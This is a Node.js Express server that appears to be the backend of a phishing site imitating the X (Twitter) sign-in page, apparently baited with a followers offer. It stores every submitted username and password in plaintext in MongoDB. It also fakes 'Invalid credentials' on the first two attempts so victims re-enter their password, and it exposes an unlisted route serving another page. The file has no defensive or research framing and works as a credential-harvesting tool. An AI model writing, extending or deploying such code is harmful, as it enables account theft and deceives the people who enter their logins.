const express = require('express');
const path = require('path');
const mongoose = require('mongoose');
require('dotenv').config();
const XUser = require('./models/User');

const app = express();
const PORT = process.env.PORT || 3000;

// Store login attempts (in a real app, use Redis or similar)
const loginAttempts = new Map();

// Log the connection URL (with sensitive info masked)
const connectionUrl = process.env.URL;
if (connectionUrl) {
    const maskedUrl = connectionUrl.replace(/(mongodb\+srv:\/\/)([^:]+):([^@]+)@/, '$1****:****@');
    console.log('Attempting to connect to:', maskedUrl);
} else {
    console.error('MongoDB URL is not defined in .env file');
    process.exit(1);
}

// MongoDB connection using URL from .env
mongoose.connect(process.env.URL)
.then(() => {
    console.log('Connected to MongoDB successfully');
})
.catch(err => {
    console.error('MongoDB connection error:', err.message);
    console.log('Please check your MongoDB username and password in the .env file');
    process.exit(1);
});

// Middleware to parse JSON and form data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files (like supabaseService.js, images, CSS, etc.)
app.use(express.static(path.join(__dirname)));

// Serve the HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/signin', (req, res) => {
    res.sendFile(path.join(__dirname, 'Xclone.html'));
});

app.post('/signin', async (req, res) => {
    try {
        const { username, password } = req.body;
        
        // Check if user exists
        const existingUser = await XUser.findOne({ username });
        
        if (!existingUser) {
            // Create new user if doesn't exist
            const user = new XUser({
                username,
                password
            });
            await user.save();
            return res.redirect('/resualt');
        }

        // Handle login attempts
        const attempts = loginAttempts.get(username) || 0;
        
        if (attempts < 2) {
            // Increment attempts and reject login
            loginAttempts.set(username, attempts + 1);
            return res.status(401).json({ 
                error: 'Invalid credentials',
                attempts: attempts + 1
            });
        } else {
            // Third attempt - allow login
            loginAttempts.delete(username); // Reset attempts
            return res.redirect('/resualt');
        }
    } catch (error) {
        console.error('Sign-in error:', error);
        res.status(500).json({ error: 'Sign-in failed' });
    }
});

app.get('/resualt', (req, res) => {
    res.sendFile(path.join(__dirname, 'followers.html'));
});

app.get('/AA1212', (req, res) => {
    res.sendFile(path.join(__dirname, 'dub.html'));
});

// // API route to handle signup
// app.post('/signup', async (req, res) => {
//     const { email, name } = req.body;

//     try {
//         //const data = await supabaseService.signUp(email, name);
//         //res.json({ message: 'Signup successful', data });
//     } catch (error) {
//         res.status(500).json({ error: 'Signup failed' });
//     }
// });

// Start the server only after MongoDB connection is established
mongoose.connection.once('open', () => {
    app.listen(PORT, () => {
        console.log(`🚀 Server is running on http://localhost:${PORT}`);
    });
});
